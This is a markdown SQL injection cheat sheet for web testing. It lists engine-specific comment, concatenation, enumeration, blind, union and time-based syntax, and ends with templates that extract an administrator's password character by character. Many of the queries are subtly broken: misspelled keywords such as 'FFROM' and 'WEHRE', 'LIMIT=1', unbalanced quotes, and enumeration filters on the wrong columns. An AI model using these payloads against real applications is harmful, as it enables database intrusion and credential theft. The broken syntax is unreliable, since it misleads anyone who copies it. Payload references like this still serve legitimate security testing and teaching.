# SQL Injection Cheat Sheet

This cheat sheet consolidates _common SQL injection syntax_, _database version techniques_, _schema enumeration_, and _engine differences_ useful during testing and exploitation. Based on PortSwigger's SQL injection cheat sheet with extended engine specifics.

---

## 💡 Comments

Comments can truncate the rest of the original query.

| Engine     | Comment Syntax                                           |
| ---------- | -------------------------------------------------------- |
| Oracle     | `--comment`                                              |
| PostgreSQL | `--comment`, `/*comment*/`                               |
| MSSQL      | `--comment`, `/*comment*/`                               |
| MySQL      | `#comment`, `-- comment` (note the space), `/*comment*/` |
| SQLite     | `--comment`, `/*comment*/`                               |

---

## 🔗 String Concatenation

Concatenate literals:

| Engine     | Syntax                                                   |
| ---------- | -------------------------------------------------------- |
| Oracle     | `'foo' \|\| 'bar'`                                       |
| PostgreSQL | `'foo' \|\| 'bar'`                                       |
| MSSQL      | `'foo' + 'bar'`                                          |
| MySQL      | `'foo' 'bar'` (note the space) or `CONCAT('foo', 'bar')` |
| SQLite     | `'foo' \|\| 'bar'`                                       |

---

## 📏 Length and Substring

| Engine     | Substring Operation        | Length Operation |
| ---------- | -------------------------- | ---------------- |
| Oracle     | `SUBSTR(col, off, len)`    | `LENGTH(col)`    |
| PostgreSQL | `SUBSTRING(col, off, len)` | `LENGTH(col)`    |
| MSSQL      | `SUBSTRING(col, off, len)` | `LEN(col)`       |
| MySQL      | `SUBSTRING(col, off, len)` | `LENGTH(col)`    |
| SQLite     | `SUBSTR(col, off, len)`    | `LENGTH(col)`    |

---

## 🧪 Database Version Detection

Helps fingerprint the database engine

```sql
-- Oracle
SELECT banner FFROM v$version;
SELECT version FROM v$instance;

-- PostgreSQL
SELECT version();

-- MySQL
SELECT @@version;

-- MSSQL
SELECT @@version;
```

SQLite has no version via SQL injection, but `SELECT sqlite_version();` exists.

---

## 📦 Enumerate Database Contents

**Tables**

| Engine     | How to list tables                                                                       |
| ---------- | ---------------------------------------------------------------------------------------- |
| Oracle     | `SELECT table_name from all_tables;`                                                     |
| PostgreSQL | `SELECT table_name from information_schema.tables WHERE table_schema='public';`          |
| MSSQL      | `SELECT table_name from information_schema.tables WHERE table_schema='BASE TABLE';`      |
| MySQL      | `SELECT table_name name from information_schema.tables WHERE table_schema='DATABASE()';` |
| SQLite     | `SELECT name FROM sqlite_master WHERE type='table';`                                     |

**Columns**

| Engine     | How to list columns                                                             |
| ---------- | ------------------------------------------------------------------------------- |
| Oracle     | `SELECT column_name FROM all_tab_columns WHERE column_name='USERS';`            |
| PostgreSQL | `SELECT column_name FROM information_schema.columns WHERE column_name='users';` |
| MSSQL      | `SELECT column_name FROM information_schema.columns WHERE column_name='users';` |
| MySQL      | `SELECT column_name FROM information_schema.columns WHERE column_name='users';` |
| SQLite     | `PRAGMA table_info(users);`                                                     |

---

## 🔮 Boolean SQLi (Blind)

Test conditions change the response:

```sql
' AND (condition) --
```

Example:

```sql
' AND '1'=1'--
' AND '1'='2'--
```

Use `LENGTH()` or `SUBSSTRING()` logic to extract text via True/False response.

---

## Union-Based SQLi

Used when output is reflected:

1. Determine column count:

```sql
' ORDER BY X--
```

If $X \in [1, A]$ --> True and $x > A$ --> False then total column count: `A`

2. Inject:

```sql
' UNION SELECT col1, col2, col3, ... FROM table --
```

Ensure same number of columns and compatible types.

---

## ⚙️ Batched / Stacked Queries

Not all engines support multiple statements

| Engine     | Stacked Queries            |
| ---------- | -------------------------- |
| Oracle     | No                         |
| PostgreSQL | Yes                        |
| MSSQL      | Yes                        |
| MySQL      | Sometimes (depends on API) |
| SQLite     | Yes                        |

---

## ⏱️ Time-Based SQLi

Force delay to infer True/False:

| Engine     | Syntax                                    |
| ---------- | ----------------------------------------- |
| Oracle     | `dbms_pipe.receive_message(('a'),10)`     |
| PostgreSQL | `SELECT pg_sleep(10)`                     |
| MSSQL      | `WAITFOR DELAY '0:0:10'`                  |
| MySQL      | `SELECT SLEEP(10)`                        |
| SQLite     | `SELECT RANDOMBLOB(1);` (no native sleep) |

---

## 📌 Notes on ORACLE

Oracle requires a table source in standalone `SELECT` statements.
Use the special table `DUAL` when selecting expressions, e.g.:

```sql
SELECT `abc` FROM dual;
```

Or in `UNION` attacks:

```sql
UNION SELECT 'abc' FROM dual --
```

To limit number of rows returned in query result:

```sql
-- Oracle
AND ROWNUM = 1
AND FETCH FIRST n ROWS

-- PostgreSQL
LIMIT 1

-- MSSQL
TOP 1

-- MySQL
LIMIT 1

-- SQLite
LIMIT 1
```

---

## 📌 Example Payload Templates

**Retrieve First Character via Boolean**

Oracle:

```sql
' AND (SELECT SUBSTR(password, 1, 1) FROM users WEHRE username='administrator' AND ROWNUM=1)='a'--
' AND (SELECT ASCII(SUBSTR(password, 1, 1)) FROM users WEHRE username='administrator' AND ROWNUM=1)=97--
```

MySQL/PostgreSQL/SQLite:

```sql
' AND (SELECT SUBSTRING(password, 1, 1) FROM users WEHRE username='administrator' LIMIT=1)='a'--
' AND (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WEHRE username='administrator' LIMIT=1)=97--
```

MSSQL:

```sql
' AND (SELECT TOP 1 SUBSTRING(password, 1, 1) FROM users WEHRE username='administrator')='a'--
' AND (SELECT TOP 1 ASCII(SUBSTRING(password, 1, 1)) FROM users WEHRE username='administrator')=97--

```
